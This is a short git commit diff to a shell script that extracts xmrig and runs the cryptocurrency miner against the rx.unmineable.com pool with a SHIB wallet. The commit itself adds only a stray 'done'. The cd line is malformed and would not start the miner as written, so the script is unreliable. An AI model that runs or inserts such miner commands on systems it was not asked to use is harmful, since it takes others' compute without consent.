e06dfdfebe4c95ff22438a61f0062057c538cf44
cassiosantosrico <102138187+cassiosantosrico@users.noreply.github.com>
2022-03-22 15:54:48 -0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -10,6 +10,7 @@ tar xf xmrig-6.16.4-linux-x64.tar.gz
 
 cd xmrig-6.16.4 ./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u SHIB:0xa9a08f84d1faA198e77c74E8770578e67B5cB1d7.SCRIPT#dhoe-uwnh -p x -k -a rx/0
 
+done
 
 
 
